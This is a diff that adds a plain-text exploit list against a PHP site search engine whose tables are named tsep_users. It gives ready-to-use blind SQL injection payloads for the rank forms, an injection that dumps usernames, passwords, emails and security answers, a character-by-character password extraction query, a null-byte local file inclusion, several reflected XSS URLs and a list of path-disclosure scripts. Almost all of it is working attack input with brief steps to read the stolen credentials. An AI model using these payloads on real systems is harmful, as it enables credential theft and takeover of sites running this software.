@@ -1,0 +1,66 @@
+exploit (BlindSQLinj after DELETE):
+POST: delete = .
+POST: deleteRank = &#039;{SQL}-- 
+
+exploit2 (BlindSQLinj after UPDATE):
+POST: modify = .
+POST: modifyRank = . 
+POST: display = .
+POST: comment = .
+POST: alt = .
+POST: percent = &#039;{SQL}-- 
+
+exploit:
+POST: insertNewRank = .
+POST: insert = .
+POST: percent = 1
+POST: alt = 1&#039;,( select concat_ws(0x3a,username,passwd,email,question,answer) from tsep_users ),1,1,1);-- 
+POST: image_show = 1
+POST: comment = 1
+POST: display = 1
+then goto /admin/rankform.php and look admin name &amp; passwd &amp; email &amp; question and answer
+
+
+exploit:
+GET: http://www.example.com/admin/?lang=../{FILE.PHP}%00
+
+exploit:
+GET: order = &#039;+and+1=if(select+ascii(lower(substring(passwd,1,1)))&gt;90+from+tsep_users+where+username=&#039;adminame&#039;,1,0)-- 
+
+exploit:
+GET: http://www.example.com/configuration.php/&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;a%20&quot;
+
+GET: http://www.example.com/admin/?errorMsg=&lt;script&gt;alert(/xss/);&lt;/script&gt;
+
+Path disc:
+/admin/examples/phpcrawl4tsep.php
+/admin/examples/fillwithcontent.php
+/admin/examples/urllist.php
+/include/indexingtimetaken.php
+/include/timeneeded.php
+/include/colorcycle.php
+/include/dbconnection.php
+/include/resultnumber.php
+/include/copyright.php
+/include/notifyofstopwords.php
+/inclued/oldmysqltell.php
+/include/indexstatus.php
+/include/pagenavigation.php
+/include/searchterm.php
+/include/stampittimestamp.php
+/include/ranking.php
+/include/ipfunctions.php
+/include/indexer_search_table.php
+/include/printpagedetails.php
+/include/deletefile.php
+/include/uploadfile.php
+/include/configfunctions.php
+
+/admin/tsepinfo.php
+
+others&#039;s exploits:
+/admin/configcontentimages.php/&quot;&gt;{XSS}&lt;&quot;
+/include/indexer_search_table.php?tsep_lng[help_copyright]=&quot;&gt;{XSS}&lt;&quot;
+/tsepsearch.php?q=sa&amp;s=0&amp;e=10&amp;user_e=10/&quot;&gt;{XSS}&lt;a&quot;
+/tsepsearch.php?q={XSS}&amp;s=0&amp;e=10/&amp;user_e=10
+
